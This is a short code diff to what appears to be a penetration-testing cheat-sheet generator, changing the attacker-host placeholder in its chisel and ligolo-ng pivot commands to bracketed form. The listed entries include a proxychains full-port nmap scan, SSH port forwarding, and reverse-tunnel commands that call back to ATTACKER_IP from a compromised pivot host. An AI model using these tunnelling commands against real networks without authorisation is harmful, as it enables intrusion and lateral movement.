@@ -406,8 +406,8 @@
       { title: "proxychains a full scan at the target", group: "scan", cmd: "proxychains -q nmap -sT -Pn -p- " + tg },
       { title: "SSH local-forward one port (e.g. RDP)", group: "forward", cmd: "ssh -L 3389:" + tg + ":3389 -N user@" + p },
       { title: "chisel reverse SOCKS — server on attacker", group: "chisel", cmd: "chisel server -p 8080 --reverse" },
-      { title: "chisel client — run on the pivot", group: "chisel", cmd: "chisel client ATTACKER_IP:8080 R:1080:socks" },
-      { title: "ligolo-ng agent — run on the pivot", group: "ligolo", cmd: "./agent -connect ATTACKER_IP:11601 -ignore-cert" }
+      { title: "chisel client — run on the pivot", group: "chisel", cmd: "chisel client <ATTACKER_IP>:8080 R:1080:socks" },
+      { title: "ligolo-ng agent — run on the pivot", group: "ligolo", cmd: "./agent -connect <ATTACKER_IP>:11601 -ignore-cert" }
     ];
   }
 
